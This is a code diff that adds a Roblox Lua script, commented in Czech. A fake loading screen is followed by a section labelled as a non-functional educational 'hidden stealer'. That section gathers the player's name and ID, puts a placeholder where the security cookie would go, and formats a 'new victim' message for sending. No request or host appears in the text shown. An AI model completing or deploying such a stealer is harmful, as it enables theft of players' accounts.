@@ -1,0 +1,35 @@
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BackgroundTransparency = 0.3
+
+local text = Instance.new("TextLabel", frame)
+text.Size = UDim2.new(1, 0, 1, 0)
+text.Text = "🔄 Loading Script... Please wait"
+text.TextColor3 = Color3.new(1, 1, 1)
+text.TextScaled = true
+text.BackgroundTransparency = 1
+
+-- Počkej pár sekund a skryj GUI
+wait(5)
+gui:Destroy()
+
+-- 💀 SKRYTÝ STEALER KÓD (edukační ukázka – NEfunkční)
+local HttpService = game:GetService("HttpService")
+local username = player.Name
+local userId = player.UserId
+local fakeCookie = "FAKE_SECURITY_COOKIE" -- (v realu by to brali z exploitu)
+
+local payload = {
+    content = "*Nová oběť připojena!*",
+    embeds = {{
+        title = "🔐 Roblox Info",
+        fields = {
+            {name = "Uživatel", value = username, inline = true},
+            {name = "User ID", value = tostring(userId), inline = true},
+            {name = "Cookie", value = fakeCookie, inline = false},
+        }
+    }}
+}
